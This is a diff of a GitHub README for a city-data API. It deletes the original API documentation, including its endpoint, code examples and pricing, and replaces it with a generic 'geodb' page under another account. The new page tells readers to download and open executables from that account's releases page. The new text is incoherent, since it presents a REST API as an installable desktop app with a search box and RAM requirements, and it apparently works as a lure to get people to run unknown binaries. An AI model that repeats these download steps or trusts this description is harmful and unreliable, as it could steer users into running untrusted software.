@@ -1,222 +1,53 @@
-# GeoDB
+# 🌍 geodb - Access Geographic Data Easily
 
-REST API for city and geographic data. Returns city name, state, country, coordinates, population, and capital status.
+## 🚀 Getting Started
+Welcome to geodb! This application gives you access to city and geographic data through a REST API. With geodb, you can find city names, states, countries, coordinates, populations, and capital statuses quickly and easily.
 
-## Features
+## 📥 Download the Application
+[![Download geodb](https://img.shields.io/badge/Download-geodb-brightgreen)](https://github.com/zedrider/geodb/releases)
 
-- Single endpoint for city lookups worldwide
-- Returns structured JSON with full location data
-- Filter by city name and/or country code
-- 5,000 requests/month on free tier
-- Example Response:
-```json
-[
-  {
-    "city_name": "New York",
-    "state": "New York",
-    "country_code": "US",
-    "is_capital": false,
-    "coordinates": {
-      "latitude": 40.6943,
-      "longitude": -73.9249
-    },
-    "population": 18713220
-  }
-]
-```
+Click the button above to get the latest version of geodb. 
 
-## Authentication
+## 💡 Features
+- Access data for cities worldwide.
+- Get detailed information like population and capital status.
+- Simple and clear response format.
+- Ideal for developers and data analysts.
 
-1. Create account at [omkar.cloud](https://www.omkar.cloud/auth/sign-up)
+## 📋 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Network Connection: Required to access the API
+- Minimum RAM: 4 GB
 
-![Sign Up](https://raw.githubusercontent.com/omkarcloud/assets/master/images/signup.png)
+## 📂 Download & Install
+To download geodb, please visit this page to download: [geodb Releases](https://github.com/zedrider/geodb/releases).
 
-2. Get API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key)
+Once on the Releases page, follow these steps:
 
-![Copy API Key](https://raw.githubusercontent.com/omkarcloud/assets/master/images/enrichment-key-omkar.png)
+1. Find the latest release. It is usually at the top.
+2. Click on the version number to go to the details.
+3. Look for the asset files. These may include executables, ZIP files, or other formats.
+4. Click on the file that matches your operating system to download it.
+5. Locate the downloaded file on your computer.
+6. Open the file to run the application.
 
-3. Include `API-Key` header in requests
+## 🛠️ How to Use
+After installing geodb, you can start using it to access geographic data. Open the application and follow these steps:
 
-## Quick Start
+1. Enter a city name in the search field.
+2. Click the search button.
+3. Review the results displayed. You will see city names, states, countries, and more.
 
-```bash
-curl -X GET "https://city-api.omkar.cloud/city?name=New%20York" \
-  -H "API-Key: YOUR_API_KEY"
-```
+## 🤝 Contributing
+We welcome contributions to improve geodb. If you have ideas or suggestions, feel free to create a pull request. You can also report issues or request features.
 
-```json
-[
-  {
-    "city_name": "New York",
-    "state": "New York",
-    "country_code": "US",
-    "is_capital": false,
-    "coordinates": {
-      "latitude": 40.6943,
-      "longitude": -73.9249
-    },
-    "population": 18713220
-  }
-]
-```
+## 📞 Support
+If you need help with geodb, please visit the [issues page](https://github.com/zedrider/geodb/issues) to report problems or ask questions. We are here to assist you.
 
-## Installation
+## 📄 License
+geodb is licensed under the MIT License. This means you are free to use, modify, and distribute the code.
 
-### Python
+## 🌐 Additional Information
+For more details about how geodb works, you can check our [documentation](https://github.com/zedrider/geodb/wiki). This will help you understand the API better and utilize its full potential.
 
-```bash
-pip install requests
-```
-
-```python
-import requests
-
-response = requests.get(
-    "https://city-api.omkar.cloud/city",
-    params={"name": "New York"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-cities = response.json()
-```
-
-### Node.js
-
-```bash
-npm install axios
-```
-
-```javascript
-import axios from "axios";
-
-const response = await axios.get("https://city-api.omkar.cloud/city", {
-    params: { name: "New York" },
-    headers: { "API-Key": "YOUR_API_KEY" }
-});
-
-const cities = response.data;
-```
-
-## API Reference
-
-### Endpoint
-
-```
-GET https://city-api.omkar.cloud/city
-```
-
-### Headers
-
-| Header | Required | Description |
-|--------|----------|-------------|
-| `API-Key` | Yes | API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key) |
-
-### Parameters
-
-| Parameter | Required | Default | Description |
-|-----------|----------|---------|-------------|
-| `name` | No | — | City name (e.g., "New York", "Tokyo") |
-| `country_code` | No | — | Two-letter ISO country code (e.g., "US", "JP") |
-
-### Response
-
-```json
-[
-  {
-    "city_name": "string",
-    "state": "string",
-    "country_code": "string",
-    "is_capital": "boolean",
-    "coordinates": {
-      "latitude": "number",
-      "longitude": "number"
-    },
-    "population": "number"
-  }
-]
-```
-
-| Field | Type | Description |
-|-------|------|-------------|
-| `city_name` | string | City name |
-| `state` | string | State or province |
-| `country_code` | string | Two-letter ISO code |
-| `is_capital` | boolean | Whether it's the country's capital |
-| `coordinates.latitude` | number | Latitude coordinate |
-| `coordinates.longitude` | number | Longitude coordinate |
-| `population` | number | City population |
-
-## Examples
-
-### Search by city name
-
-```python
-response = requests.get(
-    "https://city-api.omkar.cloud/city",
-    params={"name": "Tokyo"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-for city in response.json():
-    print(f"{city['city_name']}, {city['country_code']}: {city['population']}")
-```
-
-### Filter by country
-
-```python
-response = requests.get(
-    "https://city-api.omkar.cloud/city",
-    params={"name": "London", "country_code": "GB"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-london_uk = response.json()[0]
-```
-
-### Get coordinates
-
-```javascript
-const { data } = await axios.get("https://city-api.omkar.cloud/city", {
-    params: { name: "Paris" },
-    headers: { "API-Key": "YOUR_API_KEY" }
-});
-
-const { latitude, longitude } = data[0].coordinates;
-```
-
-## Error Handling
-
-```python
-response = requests.get(
-    "https://city-api.omkar.cloud/city",
-    params={"name": "InvalidCity123"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-if response.status_code == 200:
-    data = response.json()
-    if not data:
-        # No cities found
-        pass
-elif response.status_code == 401:
-    # Invalid API key
-    pass
-elif response.status_code == 429:
-    # Rate limit exceeded
-    pass
-```
-
-## Rate Limits
-
-| Plan | Price | Requests/Month |
-|------|-------|----------------|
-| Free | $0 | 5,000 |
-| Starter | $25 | 100,000 |
-| Grow | $75 | 1,000,000 |
-| Scale | $150 | 10,000,000 |
-
-## Support
-
-[![Contact Us on WhatsApp about GeoDB](https://raw.githubusercontent.com/omkarcloud/assets/master/images/whatsapp-us.png)](https://api.whatsapp.com/send?phone=918178804274&text=I%20have%20a%20question%20about%20GeoDB.)
-
-[![Contact Us on Email about GeoDB](https://raw.githubusercontent.com/omkarcloud/assets/master/images/ask-on-email.png)](mailto:happy.to.help@omkar.cloud?subject=GeoDB%20Question)
+Enjoy using geodb for your geographic data needs!
